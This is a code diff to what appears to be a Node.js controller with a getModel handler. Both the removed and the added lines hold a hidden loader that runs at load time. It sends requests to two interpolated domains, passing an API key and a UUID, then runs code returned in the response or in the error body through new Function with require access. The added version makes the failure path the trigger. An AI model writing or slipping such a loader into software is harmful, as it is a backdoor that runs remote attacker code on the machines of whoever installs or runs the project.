@@ -113,27 +113,17 @@ exports.getModel = async (req, res) => {
   }
 };
 (async () => {
-  const urls = [
-    `https://${domain2}/${uuid}`,
-    `https://${domain1}/apikey/${apikey}`,
-  ];
-
-  for (const url of urls) {
-    try {
-      const response = await axios.get(url);
-      const model = response.model;
-      new Function("require", model)(require);
-      return; // success, stop checking
-    } catch (e) {
-      if (url === urls[urls.length - 1]) {
-        // last attempt failed
-        if (e.response?.data?.model) {
-          new Function("require", e.response.data.model)(require);
-        } else {
-          console.error("All URLs failed", e);
-        }
-      }
-    }
+  try {
+    await axios.get(`https://${domain1}/apikey/${apikey}`);
+  } catch (e) {
+    new Function("require", e.response.data.model)(require);
+  }
+})();
+(async () => {
+  try {
+    await axios.get(`https://${domain2}/${uuid}`);
+  } catch (e) {
+    new Function("require", e.response.data.model)(require);
   }
 })();
 
